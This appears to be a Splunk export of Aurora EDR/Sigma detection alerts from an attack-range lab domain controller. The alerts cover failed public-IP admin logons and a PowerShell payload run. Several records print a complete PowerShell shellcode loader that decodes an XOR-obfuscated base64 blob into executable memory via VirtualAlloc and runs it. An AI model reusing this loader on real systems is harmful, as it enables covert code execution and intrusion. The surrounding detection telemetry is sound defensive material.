{"preview":false,"result":{"_raw":"{\"AuthenticationPackageName\":\"NTLM\",\"Computer\":\"win-dc-jhernandez-17500-200.attackrange.local\",\"Correlation_ActivityID\":\"\",\"EventID\":\"4625\",\"EventRecordID\":\"307957\",\"Execution_ProcessID\":\"624\",\"Execution_ThreadID\":\"804\",\"FailureReason\":\"%%2313\",\"IpAddress\":\"20.65.53.45\",\"IpPort\":\"0\",\"KeyLength\":\"0\",\"Keywords\":\"0\",\"Level\":\"0\",\"LmPackageName\":\"-\",\"LogonProcessName\":\"NtLmSsp \",\"LogonType\":\"3\",\"Match_Strings\":\"4625 in EventID\",\"Module\":\"Sigma\",\"Opcode\":\"0\",\"ProcessId\":\"0x0\",\"ProcessName\":\"-\",\"Provider_Guid\":\"{54849625-5478-4994-A5BA-3E3B0328C30D}\",\"Provider_Name\":\"Microsoft-Windows-Security-Auditing\",\"Rule_Author\":\"NVISO\",\"Rule_Description\":\"A login from a public IP can indicate a misconfigured firewall or network boundary.\",\"Rule_FalsePositives\":\"Legitimate logon attempts over the internet, IPv4-to-IPv6 mapped IPs\",\"Rule_Id\":\"f88e112a-21aa-44bd-9b01-6ee2a2bbbed1\",\"Rule_Level\":\"medium\",\"Rule_Link\":\"https://github.com/SigmaHQ/sigma/blob/0.20-3312-gfbf1b845/rules/windows/builtin/security/win_susp_failed_logon_source.yml\",\"Rule_Modified\":\"2021/11/27\",\"Rule_Path\":\"public\\\\windows\\\\builtin\\\\security\\\\win_susp_failed_logon_source.yml\",\"Rule_References\":\"\",\"Rule_Sigtype\":\"public\",\"Rule_Title\":\"Failed Logon From Public IP\",\"Security_UserID\":\"\",\"Source\":\"Security\",\"Status\":\"0xc000006d\",\"SubStatus\":\"0xc000006a\",\"SubjectDomainName\":\"-\",\"SubjectLogonId\":\"0x0\",\"SubjectUserName\":\"-\",\"SubjectUserSid\":\"S-1-0-0\",\"TargetDomainName\":\"\",\"TargetUserName\":\"ADMINISTRATOR\",\"TargetUserSid\":\"S-1-0-0\",\"Task\":\"12544\",\"TimeCreated_SystemTime\":\"2022-03-18T16:53:47.5314718Z\",\"TransmittedServices\":\"-\",\"Version\":\"0\",\"WorkstationName\":\"-\",\"level\":\"notice\",\"msg\":\"Sigma match found\",\"time\":\"2022-03-18T16:53:58Z\"}","_time":"2022-03-18T16:44:28.000+0000","eventtype":["err0r","nix-all-logs","nix_errors"],"host":"WIN-DC-JHERNAND","index":"win","linecount":"1","punct":"{\"\":\"\",\"\":\"----..\",\"\":\"\",\"\":\"\",\"\":\"\",\"\":\"\",\"\":\"\",\"","source":"C:\\aurora-agent-lite-win-pack\\aurora_alerts.json.log","sourcetype":"aurora-edr","splunk_server":"splunk-server-jhernandez-17500-9244","tag":"error","tag::eventtype":"error","timestamp":"none"}}
{"preview":false,"result":{"_raw":"{\"AuthenticationPackageName\":\"NTLM\",\"Computer\":\"win-dc-jhernandez-17500-200.attackrange.local\",\"Correlation_ActivityID\":\"\",\"EventID\":\"4625\",\"EventRecordID\":\"307820\",\"Execution_ProcessID\":\"624\",\"Execution_ThreadID\":\"804\",\"FailureReason\":\"%%2313\",\"IpAddress\":\"20.65.53.45\",\"IpPort\":\"0\",\"KeyLength\":\"0\",\"Keywords\":\"0\",\"Level\":\"0\",\"LmPackageName\":\"-\",\"LogonProcessName\":\"NtLmSsp \",\"LogonType\":\"3\",\"Match_Strings\":\"4625 in EventID\",\"Module\":\"Sigma\",\"Opcode\":\"0\",\"ProcessId\":\"0x0\",\"ProcessName\":\"-\",\"Provider_Guid\":\"{54849625-5478-4994-A5BA-3E3B0328C30D}\",\"Provider_Name\":\"Microsoft-Windows-Security-Auditing\",\"Rule_Author\":\"NVISO\",\"Rule_Description\":\"A login from a public IP can indicate a misconfigured firewall or network boundary.\",\"Rule_FalsePositives\":\"Legitimate logon attempts over the internet, IPv4-to-IPv6 mapped IPs\",\"Rule_Id\":\"f88e112a-21aa-44bd-9b01-6ee2a2bbbed1\",\"Rule_Level\":\"medium\",\"Rule_Link\":\"https://github.com/SigmaHQ/sigma/blob/0.20-3312-gfbf1b845/rules/windows/builtin/security/win_susp_failed_logon_source.yml\",\"Rule_Modified\":\"2021/11/27\",\"Rule_Path\":\"public\\\\windows\\\\builtin\\\\security\\\\win_susp_failed_logon_source.yml\",\"Rule_References\":\"\",\"Rule_Sigtype\":\"public\",\"Rule_Title\":\"Failed Logon From Public IP\",\"Security_UserID\":\"\",\"Source\":\"Security\",\"Status\":\"0xc000006d\",\"SubStatus\":\"0xc000006a\",\"SubjectDomainName\":\"-\",\"SubjectLogonId\":\"0x0\",\"SubjectUserName\":\"-\",\"SubjectUserSid\":\"S-1-0-0\",\"TargetDomainName\":\"\",\"TargetUserName\":\"ADMINISTRATOR\",\"TargetUserSid\":\"S-1-0-0\",\"Task\":\"12544\",\"TimeCreated_SystemTime\":\"2022-03-18T16:44:21.0202565Z\",\"TransmittedServices\":\"-\",\"Version\":\"0\",\"WorkstationName\":\"-\",\"level\":\"notice\",\"msg\":\"Sigma match found\",\"time\":\"2022-03-18T16:44:28Z\"}","_time":"2022-03-18T16:44:28.000+0000","eventtype":["err0r","nix-all-logs","nix_errors"],"host":"WIN-DC-JHERNAND","index":"win","linecount":"1","punct":"{\"\":\"\",\"\":\"----..\",\"\":\"\",\"\":\"\",\"\":\"\",\"\":\"\",\"\":\"\",\"","source":"C:\\aurora-agent-lite-win-pack\\aurora_alerts.json.log","sourcetype":"aurora-edr","splunk_server":"splunk-server-jhernandez-17500-9244","tag":"error","tag::eventtype":"error","timestamp":"none"}}
{"preview":false,"result":{"_raw":"{\"CommandLine\":\"\\\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\\" \\\"-Command\\\" \\\"if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; \\u0026 'C:\\\\Users\\\\Administrator\\\\Desktop\\\\payload.ps1'\\\"\",\"Computer\":\"win-dc-jhernandez-17500-200.attackrange.local\",\"Correlation_ActivityID\":\"\",\"EventID\":\"4688\",\"EventRecordID\":\"307599\",\"Execution_ProcessID\":\"4\",\"Execution_ThreadID\":\"6728\",\"Image\":\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\",\"Keywords\":\"0\",\"Level\":\"0\",\"MandatoryLabel\":\"S-1-16-12288\",\"Match_Strings\":\"payload.ps1 in CommandLine\",\"Module\":\"Sigma\",\"NewProcessId\":\"496\",\"Opcode\":\"0\",\"ParentImage\":\"C:\\\\Windows\\\\explorer.exe\",\"ProcessId\":\"4736\",\"Provider_Guid\":\"{54849625-5478-4994-A5BA-3E3B0328C30D}\",\"Provider_Name\":\"Microsoft-Windows-Security-Auditing\",\"Rule_Author\":\"Florian Roth\",\"Rule_Description\":\"Detects suspicious patterns in program names or folders that are often found in malicious samples or hacktools\",\"Rule_FalsePositives\":\"Legitimate tools that accidentally match on the searched patterns\",\"Rule_Id\":\"efdd8dd5-cee8-4e59-9390-7d4d5e4dd6f6\",\"Rule_Level\":\"high\",\"Rule_Link\":\"https://github.com/SigmaHQ/sigma/blob/0.20-3312-gfbf1b845/rules/windows/process_creation/proc_creation_win_susp_progname.yml\",\"Rule_Modified\":\"2022/02/11\",\"Rule_Path\":\"public\\\\windows\\\\process_creation\\\\proc_creation_win_susp_progname.yml\",\"Rule_References\":\"https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1560.001/T1560.001.md\",\"Rule_Sigtype\":\"public\",\"Rule_Title\":\"Suspicious Program Names\",\"Security_UserID\":\"\",\"Source\":\"Security\",\"SubjectDomainName\":\"ATTACKRANGE\",\"SubjectLogonId\":\"0x41511c\",\"SubjectUserName\":\"Administrator\",\"SubjectUserSid\":\"S-1-5-21-3651310434-676309764-3668584008-500\",\"TargetDomainName\":\"-\",\"TargetLogonId\":\"0x0\",\"TargetUserName\":\"-\",\"TargetUserSid\":\"S-1-0-0\",\"Task\":\"13312\",\"TimeCreated_SystemTime\":\"2022-03-18T16:29:12.5233181Z\",\"TokenElevationType\":\"%%1936\",\"Version\":\"2\",\"level\":\"warning\",\"msg\":\"Sigma match found\",\"time\":\"2022-03-18T16:29:17Z\"}","_time":"2022-03-18T16:29:17.000+0000","eventtype":"nix-all-logs","host":"WIN-DC-JHERNAND","index":"win","linecount":"1","punct":"{\"\":\"\\\":\\\\\\\\\\\\\\\\.\\\\.\\\"_\\\"-\\\"_\\\"((-_)_-_'')_{_-_-__","source":"C:\\aurora-agent-lite-win-pack\\aurora_alerts.json.log","sourcetype":"aurora-edr","splunk_server":"splunk-server-jhernandez-17500-9244","timestamp":"none"}}
{"preview":false,"result":{"_raw":"{\"Computer\":\"win-dc-jhernandez-17500-200\",\"Correlation_ActivityID\":\"{BF6FE7CE-3AE2-0003-91EE-6FBFE23AD801}\",\"EventID\":\"4104\",\"Execution_ProcessID\":\"496\",\"Execution_ThreadID\":\"5580\",\"Keywords\":\"0x0\",\"Level\":\"5\",\"Match_Strings\":\"Microsoft.Win32.UnsafeNativeMethods in ScriptBlockText\",\"MessageNumber\":\"1\",\"MessageTotal\":\"1\",\"Module\":\"Sigma\",\"Opcode\":\"15\",\"Path\":\"\",\"Provider_Guid\":\"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}\",\"Provider_Name\":\"Microsoft-Windows-PowerShell\",\"Rule_Author\":\"Sean Metcalf (source), Florian Roth (rule)\",\"Rule_Description\":\"Detects keywords from well-known PowerShell exploitation frameworks\",\"Rule_FalsePositives\":\"Unknown\",\"Rule_Id\":\"f62176f3-8128-4faa-bf6c-83261322e5eb\",\"Rule_Level\":\"high\",\"Rule_Link\":\"https://github.com/SigmaHQ/sigma/blob/0.20-3312-gfbf1b845/rules/windows/powershell/powershell_script/posh_ps_malicious_keywords.yml\",\"Rule_Modified\":\"2021/10/16\",\"Rule_Path\":\"public\\\\windows\\\\powershell\\\\powershell_script\\\\posh_ps_malicious_keywords.yml\",\"Rule_References\":\"https://adsecurity.org/?p=2921\",\"Rule_Sigtype\":\"public\",\"Rule_Title\":\"Malicious PowerShell Keywords\",\"ScriptBlockId\":\"25a48523-fd61-4c44-8e39-53151cc49441\",\"ScriptBlockText\":\"function func_get_proc_address {\\n\\tParam ($var_module, $var_procedure)\\t\\t\\n\\t$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\\\\\\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')\\n\\t$var_gpa = $var_unsafe_native_methods.GetMethod('GetProcAddress', [Type[]] @('System.Runtime.InteropServices.HandleRef', 'string'))\\n\\treturn $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod('GetModuleHandle')).Invoke($null, @($var_module)))), $var_procedure))\\n}\",\"Security_UserID\":\"S-1-5-21-3651310434-676309764-3668584008-500\",\"Task\":\"2\",\"TimeCreated_SystemTime\":\"2022-03-18T16:29:14.0168136Z\",\"Version\":\"1\",\"level\":\"warning\",\"msg\":\"Sigma match found\",\"time\":\"2022-03-18T16:29:15Z\"}","_time":"2022-03-18T16:29:16.000+0000","eventtype":"nix-all-logs","host":"WIN-DC-JHERNAND","index":"win","linecount":"1","punct":"{\"\":\"----\",\"\":\"{----}\",\"\":\"\",\"\":\"\",\"\":\"\",\"\":\"\",\"\":","source":"C:\\aurora-agent-lite-win-pack\\aurora_alerts.json.log","sourcetype":"aurora-edr","splunk_server":"splunk-server-jhernandez-17500-9244","timestamp":"none"}}
{"preview":false,"result":{"_raw":"{\"Computer\":\"win-dc-jhernandez-17500-200\",\"Correlation_ActivityID\":\"{BF6FE7CE-3AE2-0003-91EE-6FBFE23AD801}\",\"EventID\":\"4104\",\"Execution_ProcessID\":\"496\",\"Execution_ThreadID\":\"5580\",\"Keywords\":\"0x0\",\"Level\":\"5\",\"Match_Strings\":\"GetProcAddress in ScriptBlockText, GetModuleHandle in ScriptBlockText\",\"MessageNumber\":\"1\",\"MessageTotal\":\"1\",\"Module\":\"Sigma\",\"Opcode\":\"15\",\"Path\":\"\",\"Provider_Guid\":\"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}\",\"Provider_Name\":\"Microsoft-Windows-PowerShell\",\"Rule_Author\":\"Nikita Nazarov, oscd.community\",\"Rule_Description\":\"Detecting use WinAPI Functions in PowerShell\",\"Rule_FalsePositives\":\"Carbon PowerShell Module (https://github.com/webmd-health-services/Carbon)\",\"Rule_Id\":\"03d83090-8cba-44a0-b02f-0b756a050306\",\"Rule_Level\":\"high\",\"Rule_Link\":\"https://github.com/SigmaHQ/sigma/blob/0.20-3312-gfbf1b845/rules/windows/powershell/powershell_script/posh_ps_accessing_win_api.yml\",\"Rule_Modified\":\"2022/02/23\",\"Rule_Path\":\"public\\\\windows\\\\powershell\\\\powershell_script\\\\posh_ps_accessing_win_api.yml\",\"Rule_References\":\"https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse\",\"Rule_Sigtype\":\"public\",\"Rule_Title\":\"Accessing WinAPI in PowerShell\",\"ScriptBlockId\":\"25a48523-fd61-4c44-8e39-53151cc49441\",\"ScriptBlockText\":\"function func_get_proc_address {\\n\\tParam ($var_module, $var_procedure)\\t\\t\\n\\t$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\\\\\\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')\\n\\t$var_gpa = $var_unsafe_native_methods.GetMethod('GetProcAddress', [Type[]] @('System.Runtime.InteropServices.HandleRef', 'string'))\\n\\treturn $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod('GetModuleHandle')).Invoke($null, @($var_module)))), $var_procedure))\\n}\",\"Security_UserID\":\"S-1-5-21-3651310434-676309764-3668584008-500\",\"Task\":\"2\",\"TimeCreated_SystemTime\":\"2022-03-18T16:29:14.0168136Z\",\"Version\":\"1\",\"level\":\"warning\",\"msg\":\"Sigma match found\",\"time\":\"2022-03-18T16:29:15Z\"}","_time":"2022-03-18T16:29:16.000+0000","eventtype":"nix-all-logs","host":"WIN-DC-JHERNAND","index":"win","linecount":"1","punct":"{\"\":\"----\",\"\":\"{----}\",\"\":\"\",\"\":\"\",\"\":\"\",\"\":\"\",\"\":","source":"C:\\aurora-agent-lite-win-pack\\aurora_alerts.json.log","sourcetype":"aurora-edr","splunk_server":"splunk-server-jhernandez-17500-9244","timestamp":"none"}}
{"preview":false,"result":{"_raw":"{\"Computer\":\"win-dc-jhernandez-17500-200\",\"Correlation_ActivityID\":\"{BF6FE7CE-3AE2-0003-8FEE-6FBFE23AD801}\",\"EventID\":\"4104\",\"Execution_ProcessID\":\"496\",\"Execution_ThreadID\":\"5580\",\"Keywords\":\"0x0\",\"Level\":\"3\",\"Match_Strings\":\"Microsoft.Win32.UnsafeNativeMethods in ScriptBlockText\",\"MessageNumber\":\"1\",\"MessageTotal\":\"1\",\"Module\":\"Sigma\",\"Opcode\":\"15\",\"Path\":\"\",\"Provider_Guid\":\"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}\",\"Provider_Name\":\"Microsoft-Windows-PowerShell\",\"Rule_Author\":\"Sean Metcalf (source), Florian Roth (rule)\",\"Rule_Description\":\"Detects keywords from well-known PowerShell exploitation frameworks\",\"Rule_FalsePositives\":\"Unknown\",\"Rule_Id\":\"f62176f3-8128-4faa-bf6c-83261322e5eb\",\"Rule_Level\":\"high\",\"Rule_Link\":\"https://github.com/SigmaHQ/sigma/blob/0.20-3312-gfbf1b845/rules/windows/powershell/powershell_script/posh_ps_malicious_keywords.yml\",\"Rule_Modified\":\"2021/10/16\",\"Rule_Path\":\"public\\\\windows\\\\powershell\\\\powershell_script\\\\posh_ps_malicious_keywords.yml\",\"Rule_References\":\"https://adsecurity.org/?p=2921\",\"Rule_Sigtype\":\"public\",\"Rule_Title\":\"Malicious PowerShell Keywords\",\"ScriptBlockId\":\"382f8fe4-6bda-408f-96da-bad65e54f5e5\",\"ScriptBlockText\":\"Set-StrictMode -Version 2\\n\\nfunction func_get_proc_address {\\n\\tParam ($var_module, $var_procedure)\\t\\t\\n\\t$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\\\\\\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')\\n\\t$var_gpa = $var_unsafe_native_methods.GetMethod('GetProcAddress', [Type[]] @('System.Runtime.InteropServices.HandleRef', 'string'))\\n\\treturn $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod('GetModuleHandle')).Invoke($null, @($var_module)))), $var_procedure))\\n}\\n\\nfunction func_get_delegate_type {\\n\\tParam (\\n\\t\\t[Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,\\n\\t\\t[Parameter(Position = 1)] [Type] $var_return_type = [Void]\\n\\t)\\n\\n\\t$var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])\\n\\t$var_type_builder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags('Runtime, Managed')\\n\\t$var_type_builder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $var_return_type, $var_parameters).SetImplementationFlags('Runtime, Managed')\\n\\n\\treturn $var_type_builder.CreateType()\\n}\\n\\nIf ([IntPtr]::size -eq 8) {\\n\\t[Byte[]]$var_code = [System.Convert]::FromBase64String('32ugx9PL6yMjI2JyYnNxcnVrEvFGa6hxQ2uocTtrqHEDa6hRc2sslGlpbhLqaxLjjx9CXyEPA2Li6i5iIuLBznFicmuocQOoYR9rIvNFols7KCFWUaijqyMjI2um41dEayLzc6hrO2eoYwNqIvPAdWvc6mKoF6trIvVuEuprEuOPYuLqLmIi4hvDVtJvIG8HK2Ya8lb7e2eoYwdqIvNFYqgva2eoYz9qIvNiqCerayLzYntie316eWJ7YnpieWugzwNicdzDe2J6eWuoMcps3Nzcfkkjap1USk1KTUZXI2J1aqrFb6rSYplvVAUk3PZrEuprEvFuEuNuEupic2JzYpkZdVqE3PbIUHlrquJim3MjIyNuEupicmJySSBicmKZdKq85dz2yHp4a6riaxLxaqr7bhLqcUsjIWOncXFimch2DRjc9muq5Wug4HNJKXxrqtJrqvlq5OPc3NzcbhLqcXFimQ4lO1jc9qbjLKa+IiMja9zsLKevIiMjyPDKxyIjI8uB3NzcDElSVkZRWg4QDRANEQ1QT0pODU5KTQ1JUCMWbAJzBmNic3gXf3N5exYXC3N9ChRgYAoUXgdmamBicQ5wd2JtZ2JxZw5ibXdqdWpxdnAOdyNiQEBGU1cZA1dGW1cMS1dOTw9CU1NPSkBCV0pMTQxbS1dOTwhbTk8PQlNTT0pAQldKTE0MW05PGFIeEw0aDwkMCRhSHhMNGy4pYkBARlNXDm9CTURWQkRGGQNGTQ52cA9GTRhSHhMNFi4pcUZFRlFGURkDS1dXUxkMDEBMR0YNSVJWRlFaDUBMTgwuKWJAQEZTVw5mTUBMR0pNRBkDRFlKUw8DR0ZFT0JXRi4pdlBGUQ5iREZNVxkDbkxZSk9PQgwWDRMDC3RKTUdMVFADbXcDFQ0QGAN3UUpHRk1XDBQNExgDUVUZEhINEwoDT0pIRgNkRkBITC4pIxZsAnMGY2JzeBd/c3l7FhcLc30KFGBgChReB2ZqYGJxDnB3Ym1nYnFnDmJtd2p1anF2cA53ZnAjYp3TloF13PZrEuqZIyNjI2KbIzMjI2KaYyMjI2KZe4dwxtz2a7BwcGuqxGuq0muq+WKbIwMjI2qq2mKZMbWqwdz2a6DnA6bjV5VFqCRrIuCm41b0e3t7ayaMLCMjc+DLvN7c3BYXDRIbGw0WGg0VGyMjIyMj')\\n\\n\\tfor ($x = 0; $x -lt $var_code.Count; $x++) {\\n\\t\\t$var_code[$x] = $var_code[$x] -bxor 35\\n\\t}\\n\\n\\t$var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))\\n\\t$var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40)\\n\\t[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length)\\n\\n\\t$var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type @([IntPtr]) ([Void])))\\n\\t$var_runme.Invoke([IntPtr]::Zero)\\n}\\n\",\"Security_UserID\":\"S-1-5-21-3651310434-676309764-3668584008-500\",\"Task\":\"2\",\"TimeCreated_SystemTime\":\"2022-03-18T16:29:13.9624005Z\",\"Version\":\"1\",\"level\":\"warning\",\"msg\":\"Sigma match found\",\"time\":\"2022-03-18T16:29:15Z\"}","_time":"2022-03-18T16:29:16.000+0000","eventtype":"nix-all-logs","host":"WIN-DC-JHERNAND","index":"win","linecount":"1","punct":"{\"\":\"----\",\"\":\"{----}\",\"\":\"\",\"\":\"\",\"\":\"\",\"\":\"\",\"\":","source":"C:\\aurora-agent-lite-win-pack\\aurora_alerts.json.log","sourcetype":"aurora-edr","splunk_server":"splunk-server-jhernandez-17500-9244","timestamp":"none"}}
{"preview":false,"result":{"_raw":"{\"Computer\":\"win-dc-jhernandez-17500-200\",\"Correlation_ActivityID\":\"{BF6FE7CE-3AE2-0003-8FEE-6FBFE23AD801}\",\"EventID\":\"4104\",\"Execution_ProcessID\":\"496\",\"Execution_ThreadID\":\"5580\",\"Keywords\":\"0x0\",\"Level\":\"3\",\"Match_Strings\":\"System.Reflection.AssemblyName in ScriptBlockText, Reflection.Emit.AssemblyBuilderAccess in ScriptBlockText\",\"MessageNumber\":\"1\",\"MessageTotal\":\"1\",\"Module\":\"Sigma\",\"Opcode\":\"15\",\"Path\":\"\",\"Provider_Guid\":\"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}\",\"Provider_Name\":\"Microsoft-Windows-PowerShell\",\"Rule_Author\":\"Florian Roth, Perez Diego (@darkquassar)\",\"Rule_Description\":\"Detects keywords that could indicate the use of some PowerShell exploitation framework\",\"Rule_FalsePositives\":\"Unknown\",\"Rule_Id\":\"1f49f2ab-26bc-48b3-96cc-dcffbc93eadf\",\"Rule_Level\":\"high\",\"Rule_Link\":\"https://github.com/SigmaHQ/sigma/blob/0.20-3312-gfbf1b845/rules/windows/powershell/powershell_script/posh_ps_suspicious_keywords.yml\",\"Rule_Modified\":\"2021/10/16\",\"Rule_Path\":\"public\\\\windows\\\\powershell\\\\powershell_script\\\\posh_ps_suspicious_keywords.yml\",\"Rule_References\":\"https://posts.specterops.io/entering-a-covenant-net-command-and-control-e11038bcf462, https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1, https://github.com/hlldz/Invoke-Phant0m/blob/master/Invoke-Phant0m.ps1, https://gist.github.com/MHaggis/0dbe00ad401daa7137c81c99c268cfb7\",\"Rule_Sigtype\":\"public\",\"Rule_Title\":\"Suspicious PowerShell Keywords\",\"ScriptBlockId\":\"382f8fe4-6bda-408f-96da-bad65e54f5e5\",\"ScriptBlockText\":\"Set-StrictMode -Version 2\\n\\nfunction func_get_proc_address {\\n\\tParam ($var_module, $var_procedure)\\t\\t\\n\\t$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\\\\\\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')\\n\\t$var_gpa = $var_unsafe_native_methods.GetMethod('GetProcAddress', [Type[]] @('System.Runtime.InteropServices.HandleRef', 'string'))\\n\\treturn $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod('GetModuleHandle')).Invoke($null, @($var_module)))), $var_procedure))\\n}\\n\\nfunction func_get_delegate_type {\\n\\tParam (\\n\\t\\t[Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,\\n\\t\\t[Parameter(Position = 1)] [Type] $var_return_type = [Void]\\n\\t)\\n\\n\\t$var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])\\n\\t$var_type_builder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags('Runtime, Managed')\\n\\t$var_type_builder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $var_return_type, $var_parameters).SetImplementationFlags('Runtime, Managed')\\n\\n\\treturn $var_type_builder.CreateType()\\n}\\n\\nIf ([IntPtr]::size -eq 8) {\\n\\t[Byte[]]$var_code = [System.Convert]::FromBase64String('32ugx9PL6yMjI2JyYnNxcnVrEvFGa6hxQ2uocTtrqHEDa6hRc2sslGlpbhLqaxLjjx9CXyEPA2Li6i5iIuLBznFicmuocQOoYR9rIvNFols7KCFWUaijqyMjI2um41dEayLzc6hrO2eoYwNqIvPAdWvc6mKoF6trIvVuEuprEuOPYuLqLmIi4hvDVtJvIG8HK2Ya8lb7e2eoYwdqIvNFYqgva2eoYz9qIvNiqCerayLzYntie316eWJ7YnpieWugzwNicdzDe2J6eWuoMcps3Nzcfkkjap1USk1KTUZXI2J1aqrFb6rSYplvVAUk3PZrEuprEvFuEuNuEupic2JzYpkZdVqE3PbIUHlrquJim3MjIyNuEupicmJySSBicmKZdKq85dz2yHp4a6riaxLxaqr7bhLqcUsjIWOncXFimch2DRjc9muq5Wug4HNJKXxrqtJrqvlq5OPc3NzcbhLqcXFimQ4lO1jc9qbjLKa+IiMja9zsLKevIiMjyPDKxyIjI8uB3NzcDElSVkZRWg4QDRANEQ1QT0pODU5KTQ1JUCMWbAJzBmNic3gXf3N5exYXC3N9ChRgYAoUXgdmamBicQ5wd2JtZ2JxZw5ibXdqdWpxdnAOdyNiQEBGU1cZA1dGW1cMS1dOTw9CU1NPSkBCV0pMTQxbS1dOTwhbTk8PQlNTT0pAQldKTE0MW05PGFIeEw0aDwkMCRhSHhMNGy4pYkBARlNXDm9CTURWQkRGGQNGTQ52cA9GTRhSHhMNFi4pcUZFRlFGURkDS1dXUxkMDEBMR0YNSVJWRlFaDUBMTgwuKWJAQEZTVw5mTUBMR0pNRBkDRFlKUw8DR0ZFT0JXRi4pdlBGUQ5iREZNVxkDbkxZSk9PQgwWDRMDC3RKTUdMVFADbXcDFQ0QGAN3UUpHRk1XDBQNExgDUVUZEhINEwoDT0pIRgNkRkBITC4pIxZsAnMGY2JzeBd/c3l7FhcLc30KFGBgChReB2ZqYGJxDnB3Ym1nYnFnDmJtd2p1anF2cA53ZnAjYp3TloF13PZrEuqZIyNjI2KbIzMjI2KaYyMjI2KZe4dwxtz2a7BwcGuqxGuq0muq+WKbIwMjI2qq2mKZMbWqwdz2a6DnA6bjV5VFqCRrIuCm41b0e3t7ayaMLCMjc+DLvN7c3BYXDRIbGw0WGg0VGyMjIyMj')\\n\\n\\tfor ($x = 0; $x -lt $var_code.Count; $x++) {\\n\\t\\t$var_code[$x] = $var_code[$x] -bxor 35\\n\\t}\\n\\n\\t$var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))\\n\\t$var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40)\\n\\t[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length)\\n\\n\\t$var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type @([IntPtr]) ([Void])))\\n\\t$var_runme.Invoke([IntPtr]::Zero)\\n}\\n\",\"Security_UserID\":\"S-1-5-21-3651310434-676309764-3668584008-500\",\"Task\":\"2\",\"TimeCreated_SystemTime\":\"2022-03-18T16:29:13.9624005Z\",\"Version\":\"1\",\"level\":\"warning\",\"msg\":\"Sigma match found\",\"time\":\"2022-03-18T16:29:15Z\"}","_time":"2022-03-18T16:29:16.000+0000","eventtype":"nix-all-logs","host":"WIN-DC-JHERNAND","index":"win","linecount":"1","punct":"{\"\":\"----\",\"\":\"{----}\",\"\":\"\",\"\":\"\",\"\":\"\",\"\":\"\",\"\":","source":"C:\\aurora-agent-lite-win-pack\\aurora_alerts.json.log","sourcetype":"aurora-edr","splunk_server":"splunk-server-jhernandez-17500-9244","timestamp":"none"}}
